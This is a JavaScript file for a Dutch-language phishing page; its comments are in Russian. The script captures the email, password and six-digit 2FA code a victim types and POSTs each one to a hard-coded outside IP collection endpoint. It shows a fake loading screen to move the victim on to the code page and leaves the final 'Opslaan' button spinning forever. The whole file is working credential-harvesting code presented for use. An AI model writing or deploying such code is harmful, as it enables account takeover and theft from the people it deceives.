// Привязываем элементы
const email_input = document.getElementById("email");
const password_input = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const textEmailDisplay = document.getElementById("textEmail");
const code_input = document.getElementById("code");
const codeBtn = document.getElementById("codeBtn");

const API_URL = "http://77.110.116.14:5183/api/auth/collect";

loginBtn.addEventListener("click", async () => {
  loginWithDelay();

  if (email_input) {
    textEmailDisplay.textContent = `We hebben een e-mail gestuurd naar ${email_input.value} met een 6-cijferige code. Het kan enkele minuten duren voordat dit wordt ontvangen.
                                        Voer de onderstaande code in of tik op de link in de e-mail.`;
  }

  const payload = {
    email: email_input.value,
    password: password_input.value,
    step: "login",
  };

  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (err) {
    console.error("Ошибка при отправке логина:", err);
  }
});

codeBtn.addEventListener("click", async () => {
  const payload = {
    email: email_input.value,
    code: code_input.value,
    step: "code",
  };

  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (err) {
    console.error("Ошибка при отправке кода:", err);
  }
});

////////////////////////////////

function nextPage(pageId) {
  document.getElementById(pageId).classList.add("active");
}

function prevPage(pageId) {
  document.getElementById(pageId).classList.remove("active");
}

// Специальная функция для логики со второй страницы
function loginWithDelay() {
  const loader = document.getElementById("loader-screen");

  // 1. Показываем лоадер
  loader.style.display = "flex";

  // 2. Ждем 5 секунд (5000 миллисекунд)
  setTimeout(() => {
    // 3. Скрываем лоадер
    loader.style.display = "none";

    // 4. Переходим на страницу 3 (2FA)
    nextPage("page3");
  }, 5000);
}

// Функция для финальной кнопки "Opslaan"
function showLoader() {
  const loader = document.getElementById("loader-screen");
  loader.style.display = "flex";
  // Здесь лоадер остается крутиться бесконечно, как ты и просил
}

const updateViewport = () => {
  // Получаем реальную высоту видимой области (без клавиатуры)
  const vv = window.visualViewport;
  const pages = document.querySelectorAll(".page");

  pages.forEach((page) => {
    // Устанавливаем высоту страницы равной видимой области
    page.style.height = `${vv.height}px`;

    // Смещаем страницу вверх на величину отступа клавиатуры (для iOS)
    page.style.top = `${vv.offsetTop}px`;
  });
};

// Слушаем изменения вьюпорта (открытие/закрытие клавы)
if (window.visualViewport) {
  window.visualViewport.addEventListener("resize", updateViewport);
  window.visualViewport.addEventListener("scroll", updateViewport);
  // Вызываем один раз при загрузке
  updateViewport();
}

// Дополнительный фикс для Android: прокрутка к инпуту
inputs.forEach((input) => {
  input.addEventListener("focus", () => {
    setTimeout(() => {
      input.scrollIntoView({ behavior: "smooth", block: "center" });
    }, 300);
  });
});
